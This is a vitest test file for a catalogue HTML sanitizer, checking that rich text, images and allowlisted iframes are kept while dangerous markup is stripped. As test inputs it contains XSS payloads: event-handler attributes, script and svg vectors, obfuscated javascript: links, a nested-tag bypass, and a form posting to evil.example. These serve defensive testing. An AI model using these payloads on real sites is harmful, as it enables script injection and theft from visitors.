import {
	EMBED_IFRAME_HOSTS,
	sanitizeCatalogueHtml,
} from "@/helpers/sanitizeHtml";
import { describe, expect, it } from "vitest";

const text = (html: string) => sanitizeCatalogueHtml(html, "text");
const embed = (html: string) => sanitizeCatalogueHtml(html, "embed");

describe("sanitizeCatalogueHtml", () => {
	describe("what it keeps", () => {
		it("leaves ordinary rich text exactly as written", () => {
			const html =
				"<h2>Our story</h2><p>We roast <strong>every</strong> Tuesday.</p><ul><li>One</li></ul>";

			expect(text(html)).toBe(html);
		});

		it("keeps links, images and tables", () => {
			expect(
				text('<img src="https://cdn.example.com/a.jpg" alt="A cup">'),
			).toContain("https://cdn.example.com/a.jpg");
			expect(text("<table><tr><td>2.50</td></tr></table>")).toContain("<td>");
		});

		it("keeps inline styles, which pasted rich text and embeds lean on", () => {
			expect(text('<p style="text-align:center">Hi</p>')).toContain(
				"text-align:center",
			);
		});

		it("keeps an inline data: image but not a data: document", () => {
			expect(text('<img src="data:image/png;base64,iVBORw0K">')).toContain(
				"data:image/png",
			);
			expect(
				text('<a href="data:text/html,<script>alert(1)</script>">x</a>'),
			).not.toContain("data:text/html");
		});
	});

	describe("what it drops", () => {
		it("strips an event handler, the cheapest way in", () => {
			// This is what a fetched page or an OCR'd photo would try to plant.
			const cleaned = text('<img src="x" onerror="alert(1)">');

			expect(cleaned).not.toContain("onerror");
			expect(cleaned).toContain("<img");
		});

		it("strips every other handler spelling too", () => {
			for (const attack of [
				'<div onclick="steal()">x</div>',
				'<body onload="steal()">x</body>',
				'<div ONMOUSEOVER="steal()">x</div>',
				'<details open ontoggle="steal()">x</details>',
			]) {
				expect(text(attack).toLowerCase()).not.toContain("steal()");
			}
		});

		it("removes script tags and their contents", () => {
			expect(text("<p>Hi</p><script>window.x=1</script>")).toBe("<p>Hi</p>");
		});

		it("removes svg, which carries its own script vectors", () => {
			expect(text("<svg><script>alert(1)</script></svg>")).not.toContain(
				"alert",
			);
			expect(text('<svg onload="alert(1)"></svg>')).not.toContain("onload");
		});

		it("removes forms, so nothing can phish from inside a catalogue", () => {
			const cleaned = text(
				'<form action="https://evil.example/steal"><input name="card"></form>',
			);

			expect(cleaned).not.toContain("<form");
			expect(cleaned).not.toContain("<input");
		});

		it("refuses a javascript: link", () => {
			expect(text('<a href="javascript:alert(1)">tap</a>')).not.toContain(
				"javascript:",
			);
		});

		it("gives every link rel=noopener, so the opener is not handed over", () => {
			expect(
				text('<a href="https://example.com" target="_blank">x</a>'),
			).toContain('rel="noopener noreferrer"');
		});

		it("survives markup designed to break a naive stripper", () => {
			// The reason this is a parser and not a regex. What matters is that no
			// executable markup survives - a payload left behind as escaped text
			// is inert, so the assertion is about tags and handlers, not about the
			// string "alert" appearing somewhere in the prose.
			for (const attack of [
				"<scr<script>ipt>alert(1)</script>",
				'<img src="x" onerror=alert(1)>',
				'<img/src="x"/onerror="alert(1)">',
				'<a href="jav&#x09;ascript:alert(1)">x</a>',
				'<iframe src="javascript:alert(1)"></iframe>',
			]) {
				const cleaned = text(attack).toLowerCase();
				expect(cleaned).not.toContain("<script");
				expect(cleaned).not.toContain("<iframe");
				expect(cleaned).not.toMatch(/\son\w+\s*=/);
				expect(cleaned).not.toContain("javascript:");
			}
		});
	});

	describe("the text profile is prose only", () => {
		it("drops an iframe even from an allowlisted host", () => {
			// A text section has no business embedding anything.
			expect(
				text('<iframe src="https://www.youtube.com/embed/abc"></iframe>'),
			).not.toContain("<iframe");
		});
	});

	describe("the embed profile", () => {
		it("keeps an iframe from an allowlisted host", () => {
			const cleaned = embed(
				'<iframe src="https://www.youtube.com/embed/abc" allowfullscreen></iframe>',
			);

			expect(cleaned).toContain("<iframe");
			expect(cleaned).toContain("youtube.com/embed/abc");
		});

		it("keeps a subdomain of an allowlisted host", () => {
			expect(
				embed('<iframe src="https://player.vimeo.com/video/1"></iframe>'),
			).toContain("player.vimeo.com");
		});

		it("drops an iframe pointing anywhere else", () => {
			// The one that matters: an injected page naming its own host.
			expect(
				embed('<iframe src="https://evil.example/pay"></iframe>'),
			).not.toContain("<iframe");
		});

		it("is not fooled by a lookalike host", () => {
			for (const host of [
				"https://youtube.com.evil.example/x",
				"https://notyoutube.com/x",
				"https://evil.example/?x=youtube.com",
			]) {
				expect(embed(`<iframe src="${host}"></iframe>`)).not.toContain(
					"<iframe",
				);
			}
		});

		it("drops an iframe with no src at all", () => {
			expect(embed("<iframe></iframe>")).not.toContain("<iframe");
		});

		it("still strips scripts and handlers", () => {
			expect(embed('<div onclick="steal()"><script>x</script></div>')).toBe(
				"<div></div>",
			);
		});

		it("names every host explicitly", () => {
			// A wildcard would make the allowlist pointless; this catches one
			// creeping in.
			for (const host of EMBED_IFRAME_HOSTS) {
				expect(host).not.toContain("*");
				expect(host).toMatch(/^[a-z0-9.-]+\.[a-z]{2,}$/);
			}
		});
	});

	it("handles empty and missing input", () => {
		expect(sanitizeCatalogueHtml("")).toBe("");
		expect(sanitizeCatalogueHtml(undefined)).toBe("");
		expect(sanitizeCatalogueHtml(null)).toBe("");
	});
});
